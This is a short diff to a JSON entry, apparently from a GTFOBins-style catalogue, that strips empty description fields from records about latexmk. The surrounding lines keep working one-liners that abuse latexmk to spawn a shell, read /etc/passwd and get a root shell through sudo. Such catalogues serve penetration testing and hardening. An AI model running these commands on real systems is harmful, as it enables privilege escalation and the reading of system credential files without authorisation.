@@ -2,17 +2,17 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "latexmk -e 'exec \"/bin/sh\";'\n"
       },
       {
-        "description": "",
+        
         "code": "latexmk -latex='/bin/sh #' /dev/null\n"
       }
     ],
     "file-read": [
       {
-        "description": "",
+        
         "code": "latexmk -e 'open(X,\"/etc/passwd\");while(<X>){print $_;}exit'\n"
       },
       {
@@ -22,7 +22,7 @@
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo latexmk -e 'exec \"/bin/sh\";'\n"
       }
     ]
